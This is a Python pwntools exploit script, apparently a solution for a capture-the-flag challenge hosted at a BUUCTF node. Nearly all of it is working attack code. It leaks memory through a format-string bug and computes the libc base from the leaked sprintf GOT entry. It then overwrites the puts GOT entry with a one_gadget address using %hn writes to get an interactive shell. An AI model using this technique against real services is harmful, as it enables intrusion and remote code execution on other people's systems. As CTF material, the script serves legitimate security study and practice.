from pwn import *

io=remote('node3.buuoj.cn',25613)

def leak(addr):
    payload = "%10$s.TMP" + p32(addr)
    io.sendline(payload)
    print "leaking:", hex(addr)
    io.recvuntil('Repeater:')
    resp = io.recvuntil(".TMP")
    ret = resp[:-4:]
    print ret, len(ret)
    remain = io.recvrepeat(0.2)
    return ret

'''
start_addr = 0x8048000
leak(0x8048000)

text_seg = ''
try:
    while True:
        ret = leak(start_addr)
        text_seg += ret
        start_addr += len(ret)
        if start_addr>=0x8048b00:
            break
        if len(ret) == 0:
            start_addr += 1
            text_seg += '\x00'
except Exception as e:
    print e

print '[+]', len(text_seg)
with open('dump_bin', 'wb') as fout:
    fout.write(text_seg)
'''

puts_got=0x804a014
sprint_got=0x804a030

payload = "%10$s.TMP" + p32(sprint_got)
io.sendline(payload)
io.recvuntil('Repeater:')
sprint_add=u32(io.recv(4))
print(hex(sprint_add))

libc_base=sprint_add-0x049080
print(hex(libc_base))
one_gadget=libc_base+0x3a80c
a=one_gadget%0x10000&0xffff
print(hex(a))
b=(one_gadget/0x10000)%0x10000&0xffff
print(hex(b))
pause()
payload = '%' + str(a-9) + 'c' +'%16$hn'
payload += '%' + str(b - a) + 'c' +'%17$hn'
payload = payload.ljust(33, 'A')+p32(puts_got)+p32(puts_got+2)
io.sendline(payload)

io.interactive()
